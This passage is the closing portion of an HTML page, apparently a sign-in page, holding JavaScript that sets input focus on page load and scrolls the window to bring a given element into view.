  }
  if (!('ontouchstart' in window)) {
  gaia_attachEvent(window, 'load', gaia_setFocus);
  }
  })();
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
  </body>
</html>
